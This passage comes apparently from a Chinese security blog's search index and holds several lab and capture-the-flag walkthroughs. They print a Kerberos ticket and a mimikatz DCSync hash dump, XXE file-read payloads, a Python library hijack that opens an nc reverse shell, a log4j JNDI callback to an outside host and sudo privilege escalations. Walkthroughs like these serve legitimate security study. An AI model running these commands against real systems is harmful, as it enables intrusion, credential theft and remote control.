iPDy9zMJWBDgeMsEEmB/uh492tq+i3g8o49PocQ2TqcnRBPCiAEbpWhpz/LDb6P6f+ySqupcTcM5q9G+6CT6Rj/aMDAjqZEsRpfb\n    agn3XEjKWbF+kpAuuvr+eGd0xICbySdM21JRTjqZmZmUPkEe5Y0zKH+wVUUVJOAv8BVeKirxdKtYyDYiudFtUUGGkIzt2Z3J1yJY\n    GA8B90UklsraI8O6Q83i2nE11WkcxEXceYh7PBoeL6ivncb8UqZK2Nh07+1QlILNCx+5WFFLjNSoBLhofg3TIsPCr2zFNXTNbBPv\n    zP+bjqJawf7BY0KUWNLvgAltKMXX1T9pzNREspsKwRMjXZgsyTbil3reoEciEexNtXVhWxrk+xbp9DIL/74f4rafpIMsi7myoH6a\n    u1kjVexmmP4wOWp7KGvMm1gNp+XeakyHPiFlqIt4V0b4KGfd9Zd3rtQI3gtM7oeUm6PDlEn9vK0MVBpZZJeW6IDkZdXC7SBmPM1z\n    p0uno3wGRj0MuqqnPaV8XRJR0sEaNGD8HABfQkdCMHm5GQ8w71AIEy9i2otNPegf6P0j4EPsNwtyo2o97GKu/y27tvKv1FH43S4G\n    ij5gjiKBxIn2JtQ9oPvb0v+2SZWU08xE6v+b79PsWvr5STsl4eUJHnTuXizQfsY597gQAVgKD7vKeIXEsgb11VVP9HCtUjxCmBNS\n    25QzZvXbuWkEJ6k/7AYu0qvT3auHC1cbf4MmuMrc/DlT4MphkuUF5j8hfSEgEAVWhVZVuPZA3v6C+O8PYmDl1d9lT6JjZ5wuQrAG\n    Dwt7+cZ9wzuWLDUkB1dtiTm0cuFLXAmOLLDjpSWxIXK2B9TNAagAq2slNrb775ovLLdo/swtuRAKazjqgCAygra59RWoqP+loVv8\n    nxii1cB/M4tFLpGuZlTdOnyME8JT8D40++QW5IxMPffywi5tpjhDUnVC1wtK49BOaljvJKH8LcWHWyALrv2j8De6HPabKhCcnDiY\n    /w7QHVbcAh/Jo64uH2aYRSQEz5j7oGpAAP3ENCvzEaV8e/53wwRqjyife177PX7j9/ZfoqzfiRnr1kjeHIZsGw5zYyTmLbB/91Np\n    RN2jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCClV6tyB9NAYvRnxe9wuyHOhysxVh63TouQkdqL\n    8MLxbKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxODAyMjgwNFqmERgPMjAy\n    NTA0MTgxMjI4MDRapxEYDzIwMjUwNDI1MDIyODA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9S\n    QU5HLkxBQg==\n\n[*] Ticket cache size: 1\n\n~~~\n\nå¯¼å…¥ TGT ç„¶å DCSync\n\n~~~\nRubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6rh73GDFsxBznVrGsdmcNb9fO1z8fVnV/kQUwXHY0vvUHSorZebamFLkiZi+LEkih3n4TJMOlCI8vlnlS5lPlr03uPc5nd6Pw7PWoVw7m2UH/TmMy4nuBKVVbKEIImNbFyhTleg75qJ+5D224ws/fpRGtQyH0WPmyMbevlI+xTTOLJGe9+YScZMva/hvc2nPq09ZNNzIMo8erEYpJCv1VucuzcoUrJFGTtASWqa0Aaeza+mypwP7OGmc2qnQEMu8l1XIEqe7JYdY934vsm37k8KarPLFlzyOhbzDW4t/GjlZ1aHXSLj332T90BxfZKoSe7tnA8cldicFQ8LmGBWBKeKms6sc8K4KQVGMdhyjno5L5jeKqtL49oc+a44kyJYlGjXnKpep5seUp3+2TXXvmF9/HnHSG+M6QQpepWGdfk6diRhgDvZyq1AX6GggRsXfIEpE721UcTowO2HQOfsv+W++pTiAoEvrkU6ciJ3VI3EZFelGkq3hfZ3MQydIdBCPVeaDwE1fcp05wGuDmuFDhf+C1nelwaTqYJIZScVgR+7o4FcGpStyycsbBMfzdasL70KSV3se6ZlvY24/Binnb3YOHMpWkpLRjUovQ7ep2fCN0f6Pt/P8JTCVC0oCFIy05otlw3n8nd4NctrNBWQBevIiuAobMrJ1Ww5UbSQHrCF6hTV6NTbL1irI3wR10rwNkaxWpspvcL5/HOTzXXRtq619o0lTdpz60KSroci5nuj4WfPtQ6ESiU8c4P9Y/exWUmhOGN10Wg1t4j4k+agTrvK2dy2ybLn1FNkqWMfMr3vcUm8BU7ESstKZp47FG1pkaQl6/bjGwElN0BhycbT8L1yxIj+rFspX3d6olXwiMIaF50EV5DM1V3oH/OJu5sHbIFqrGkRqooDTfrHyF8c1AnruzDtD2lxipt043llvOURkRj8Qd/qIiRZBqnYo4RD95J9J8Jbim35hFzbuV5PMS5Ekw9oRfzsGCD5VeKBb9i02mJTvWUqJjZi/YWI9wKaeKKCTKHYKKSmDfkJlF4gLUp12XwuTe4zEwhXUgBYEC7N7EA6u0/9dxwL5AWaRtOqL05rgFu2Ix2+wfBu1n4ToxGmYke44n6JSSXCqKW2KPkznAU0QPvhcYwjZsOFo4R/bVe9qQAcHBLwQ+9fq8DZBnRStKlgmIMeJXCPAPv5da69p2BnR4Bq+X71X5pWB4C0xHZtmxZ71ahe+cZYmDaap8SEvI7BDTkKaDDnvp3cLSVvX5k5uGrjq06yKqpYjlcfai1Yy8GXlecqf2xQ8b6RjkdPkHKVLQZdGZdZMc77Bj5IXwlGvwSQK5PMxo4z1zceza8WQ7WM/iIVwwDAEklXK9bW3pjfHCX9sB5YxAUA/BbJMxuSc1Q2yMpc8CrRNoNNPY184wjlPMAE0wLtAkkiJJlmhkupOA7ZpdlAwvYPEujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCkn5s0Ub8lLXnRynzBbuyWO7uYW7F68Wp1NYL+h5IWoqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxMDA1Mjg0N1qmERgPMjAyNTAyMTAxNTI4NDdapxEYDzIwMjUwMjE3MDUyODQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==\n~~~\n\n~~~\nmimikatz.exe \"lsadump::dcsync /all /csv\"\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC01.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  767e06b9c74fd628dd13785006a9092b        514\n1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512\n1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512\n1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096\n1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096\n1000    DC01$   23414273a692373e6e076d5fdbb2c213        532480\n500     Administrator   4889f6553239ace1f7c47fa2c619c252        512\n1103    FILESERVER$     dd213f63df5b16b2daa567705ca88ac7        4096\n1104    WIN19$  b6547b5e9c27c42b5cb096f1c922bc3a        528384\n\n~~~\n\nå¯ä»¥æ‹¿åˆ°åŸŸæ§çš„å“ˆå¸Œ\n\nç„¶åç™»å½•å³å¯\n\n~~~\nC:\\Users\\Administrator\\flag> type flag04.txt\n~~~\n\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"HackmyVM-system","url":"/2025/04/17/Hackmyvm-system/","content":"\n\n\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -l\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:72:be:a6       PCS Systemtechnik GmbH\n192.168.31.141  08:00:27:27:28:54       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.141å°±æ˜¯é¶æœºip\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.141\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 03:39 EDT\nNmap scan report for 192.168.31.141\nHost is up (0.0029s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:27:28:54 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n~~~\n\n# 80ç«¯å£\n\næœ‰ä¸€ä¸ªç™»å½•çš„é¡µé¢ï¼Œé€šè¿‡æŸ¥çœ‹è¯·æ±‚å¤´å¯ä»¥å‘ç°ä»–æ˜¯ä»¥xmlçš„æ ¼å¼ä¼ è¾“çš„\n\n~~~\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><details><email>123@123.com</email><password>123</password></details>\n~~~\n\nè¯•ä¸€è¯•xxeæ³¨å…¥\n\n~~~\n<!DOCTYPE test [ \n<!ENTITY test1 SYSTEM \"file:///etc/passwd\"> \n]><details><email>$test1;</email><password>123</password></details>\n~~~\n\n~~~\n<p align='center'> <font color=white size='5pt'> root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndavid:x:1000:1000::/home/david:/bin/bash\n is already registered! </font> </p>\n~~~\n\nè¯»å–davidç”¨æˆ·çš„ç§é’¥å°è¯•ç™»å½•ï¼Œä½†æ˜¯ä¼šç™»å½•å¤±è´¥ï¼Œé€šè¿‡fuzzå¯ä»¥çŸ¥é“/home/davidè¿˜æœ‰ä¸€ä¸ª.viminfo\n\n~~~\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.31.141/magic.php  -d '<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///home/david/FUZZ\"> ]> <details><email>&xxe;</email><password>das</password></details>' --fw 11\n~~~\n\n~~~\n # This viminfo file was generated by Vim 8.2.\n# You may edit it if you're careful!\n\n# Viminfo version\n|1,4\n\n# Value of 'encoding' when this file was written\n*encoding=utf-8\n\n\n# hlsearch on (H) or off (h):\n~h\n# Command Line History (newest to oldest):\n:wq!\n|2,0,1648909714,,\"wq!\"\n\n# Search String History (newest to oldest):\n\n# Expression History (newest to oldest):\n\n# Input Line History (newest to oldest):\n\n# Debug Line History (newest to oldest):\n\n# Registers:\n\n# Password file Created:\n'0  1  3  /usr/local/etc/mypass.txt\n|4,48,1,3,1648909714,\"/usr/local/etc/mypass.txt\"\n\n# History of marks within files (newest to oldest):\n\n> /usr/local/etc/mypass.txt\n\t*\t1648909713\t0\n\t\"\t1\t3\n\t^\t1\t4\n\t.\t1\t3\n\t+\t1\t3\n~~~\n\nç„¶åè¯»å–/usr/local/etc/mypass.txtæ–‡ä»¶\n\ndavidçš„å¯†ç ä¸º`h4ck3rd4v!d `\n\n# ææƒ\n\nä¸Šä¼ ä¸€ä¸ªpspy64æŸ¥çœ‹ï¼Œå‘ç°æ¯éš”ä¸€æ®µæ—¶é—´ä¼šè¿è¡Œä¸€æ¬¡suid.pyæ–‡ä»¶\n\n~~~\n2025/04/18 04:01:01 CMD: UID=0     PID=670    | /bin/sh -c /usr/bin/python3.9 /opt/suid.py\n~~~\n\n~~~\n#suid.py\nfrom os import system\nfrom pathlib import Path\n\n# Reading only first line\ntry:\n    with open('/home/david/cmd.txt', 'r') as f:\n        read_only_first_line = f.readline()\n    # Write a new file\n    with open('/tmp/suid.txt', 'w') as f:\n        f.write(f\"{read_only_first_line}\")\n    check = Path('/tmp/suid.txt')\n    if check:\n        print(\"File exists\")\n        try:\n            os.system(\"chmod u+s /bin/bash\")\n        except NameError:\n            print(\"Done\")\n    else:\n        print(\"File not exists\")\nexcept FileNotFoundError:\n    print(\"File not exists\")\n~~~\n\nè¿™ä¸ªè„šæœ¬æ°¸è¿œä¸ä¼šæ‰§è¡Œchmodï¼ŒæŸ¥çœ‹æ˜¯å¦å¯ä»¥åŠ«æŒ\n\n~~~\npython3 -c 'import sys; print(sys.path)'\n['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages']\ndavid@system:/usr/lib/python3.9$ find ./ -writable 2>/dev/null\n./os.py\n~~~\n\nå‘os.pyå°¾éƒ¨æ·»åŠ \n\n~~~\nimport subprocess\ndef shell():\n    import subprocess\n    subprocess.call(\"nc\" + \"192.168.31.129 9999 -e /bin/bash\", shell=True)\nshell()\n~~~\n\nç„¶åç›‘å¬ä¸€ä¸ªç«¯å£é™é™ç­‰shellå¼¹å›æ¥\n\n~~~\nid\nuid=0(root) gid=0(root) groups=0(root)\n~~~\n\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Blackhat","url":"/2025/04/17/Hackmyvm-Blackhat/","content":"\n\n\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -læ‰«æ\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:73:b2:7a       PCS Systemtechnik GmbH\n192.168.31.140  08:00:27:19:a9:32       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.140æ˜¯é¶æœºåœ°å€\n\nç„¶åæ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.140\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 00:16 EDT\nNmap scan report for 192.168.31.140\nHost is up (0.0019s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:19:A9:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.85 seconds\n~~~\n\nåªå¼€äº†ä¸€ä¸ª80ç«¯å£ï¼Œæ‰«æä¸€ä¸‹ç›®å½•å¯ä»¥æ‰«æåˆ°ä¸€ä¸ªphpinfo.php\n\n~~~\nLoaded Modules\tcore mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_backdoor mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status\n~~~\n\nmod_backdoor å­˜åœ¨æ¼æ´\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# curl 192.168.31.140 -H \"Backdoor: id\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n~~~\n\nåå¼¹ä¸€ä¸ªshellå‡ºæ¥ï¼Œä¸Šä¼  linpeas.sh ï¼Œè¿è¡Œçœ‹ç»“æœ\n\n~~~\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Files with ACLs (limited to 50)\nâ•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls\n# file: /etc/sudoers\nUSER   root       r--\nuser   darkdante  rw-\nGROUP  root       r--\nmask              rw-\nother             ---\n~~~\n\nå¯ä»¥çœ‹åˆ°sudoersæ–‡ä»¶darkdanteæœ‰å†™çš„æƒé™ï¼Œdarkdanteç›´æ¥suå°±ç™»å½•äº†å“ˆå“ˆå“ˆå“ˆå“ˆ\n\nå†™å…¥sudoersæ–‡ä»¶\n\n~~~\ndarkdante ALL=(ALL:ALL) ALL\n~~~\n\nç„¶åsudo suï¼ŒææƒæˆåŠŸ\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"æ˜¥ç§‹äº‘é•œ-Certify","url":"/2025/04/16/æ˜¥ç§‹äº‘é•œ-Certify/","content":"\n\n\n# FLAG1\n\nå…ˆç”¨fscanæ‰«ä¸€æ‰«\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ../pentest/fscan/fscan2 -h 39.99.135.211\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-16 11:59:40] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-16 11:59:40] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-16 11:59:40] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-04-16 11:59:41] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-16 11:59:41] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-16 11:59:41] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.135.211:22\n[2025-04-16 11:59:41] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.135.211:80\n[2025-04-16 11:59:41] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.135.211:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-16 11:59:45] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.135.211:8983\n[2025-04-16 11:59:46] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.135.211:80 => [http] ç‰ˆæœ¬:1.18.0 äº§å“:nginx ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu\n[2025-04-16 11:59:55] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.135.211:8983 => [http] äº§å“:Apache Solr Banner:[HTTP/1.1 302 Found.Location: http://172.22.9.19:8983/solr/.]\n[2025-04-16 11:59:55] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 3\n[2025-04-16 11:59:55] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-16 11:59:55] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle\n[2025-04-16 11:59:55] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.135.211      çŠ¶æ€ç :200 é•¿åº¦:612    æ ‡é¢˜:Welcome to nginx!\n[2025-04-16 11:59:56] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.135.211:8983 çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://39.99.135.211:8983/solr/\n[2025-04-16 11:59:57] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.135.211:8983/solr/ çŠ¶æ€ç :200 é•¿åº¦:16555  æ ‡é¢˜:Solr Admin\n[2025-04-16 12:00:04] [SUCCESS] æ‰«æå·²å®Œæˆ: 5/5\n~~~\n\n39.99.135.211:8983æ˜¯ä¸€ä¸ªsolré¢æ¿ï¼Œå­˜åœ¨log4jæ¼æ´\n\n~~~\nhttp://39.99.135.211:8983/solr/admin/cores?action=${jndi:ldap://tc94uide908k5qcv0xurpcoorfx6lw9l.oastify.com}\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify1.png)\n\nä¸Švpsï¼Œå¯ä»¥åˆ©ç”¨[java-chains](https://github.com/vulhub/java-chains)åå¼¹ä¸€ä¸ªshell,åå¼¹çš„shellå¦‚æœä¸èˆ’æœå¯ä»¥å†™ä¸€ä¸ªå…¬é’¥è¿›å»\n\n~~~\nsolr@ubuntu:/opt/solr$ sudo -l\nsudo -l\nMatching Defaults entries for solr on ubuntu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser solr may run the following commands on ubuntu:\n    (root) NOPASSWD: /usr/bin/gr\n~~~\n\nææƒ`sudo grc --pty /bin/sh`\n\n~~~\nsolr@ubuntu:~$ sudo grc --pty /bin/sh\n# id\nuid=0(root) gid=0(root) groups=0(root)\n~~~\n\nææƒåˆ°rootåï¼Œå†™ä¸€ä¸ªå…¬é’¥è¿›å»ï¼Œflag01åœ¨/root/flagä¸‹ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªfscanï¼Œå†åšä¸€ä¸ªä»£ç†\n\n# FLAG2\n\næŸ¥çœ‹ä¸€ä¸‹å†…ç½‘çš„ipç«¯ï¼Œå¼€æ‰«ï¼\n\n~~~\nroot@ubuntu:/tmp# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:26:2b:c3 brd ff:ff:ff:ff:ff:ff\n    inet 172.22.9.19/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315357456sec preferred_lft 315357456sec\n    inet6 fe80::216:3eff:fe26:2bc3/64 scope link\n       valid_lft forever preferred_lft forever\n~~~\n\n~~~\nroot@ubuntu:/tmp# ./fscan2 -h 172.22.9.19/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-17 00:40:03] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-17 00:40:03] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-17 00:40:03] [INFO] CIDRèŒƒå›´: 172.22.9.0-172.22.9.255\n[2025-04-17 00:40:03] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.9.0.%!d(string=172.22.9.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-17 00:40:03] [INFO] è§£æCIDR 172.22.9.19/24 -> IPèŒƒå›´ 172.22.9.0-172.22.9.255\n[2025-04-17 00:40:03] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-04-17 00:40:03] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-17 00:40:03] [SUCCESS] ç›®æ ‡ 172.22.9.19     å­˜æ´» (ICMP)\n[2025-04-17 00:40:03] [SUCCESS] ç›®æ ‡ 172.22.9.7      å­˜æ´» (ICMP)\n[2025-04-17 00:40:03] [SUCCESS] ç›®æ ‡ 172.22.9.26     å­˜æ´» (ICMP)\n[2025-04-17 00:40:03] [SUCCESS] ç›®æ ‡ 172.22.9.47     å­˜æ´» (ICMP)\n[2025-04-17 00:40:06] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4\n[2025-04-17 00:40:06] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:88\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:80\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:80\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:22\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.19:80\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:21\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.19:22\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:445\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.26:445\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:445\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:389\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:139\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:139\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.26:139\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:135\n[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.26:135\n[2025-04-17 00:40:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:22 => [ssh] ç‰ˆæœ¬:7.6p1 Ubuntu 4ubuntu0.7 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.]\n[2025-04-17 00:40:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:21 => [ftp] ç‰ˆæœ¬:3.0.3 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.3).]\n[2025-04-17 00:40:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.19:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH 